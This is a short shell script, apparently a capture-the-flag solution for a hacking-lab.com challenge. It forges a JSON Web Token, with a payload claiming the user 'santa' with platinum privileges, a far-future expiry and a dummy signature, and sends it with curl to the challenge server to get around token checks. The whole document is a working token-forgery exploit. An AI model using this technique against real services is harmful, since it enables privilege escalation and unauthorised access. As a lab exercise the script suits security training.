#! /bin/sh

BASE='http://whale.hacking-lab.com:10101'

t1=$(echo -n '{"alg":"HS256"}' | base64 -w0)
t2=$(
	echo -n '{"user":{"username":"santa","platinum":true},"exp":2000000000}' \
	| base64 -w0 \
	| sed 's/=//g'
)
t3='something'

token="${t1}.${t2}.${t3}"

curl -X GET "${BASE}/fsja/random?token=${token}"
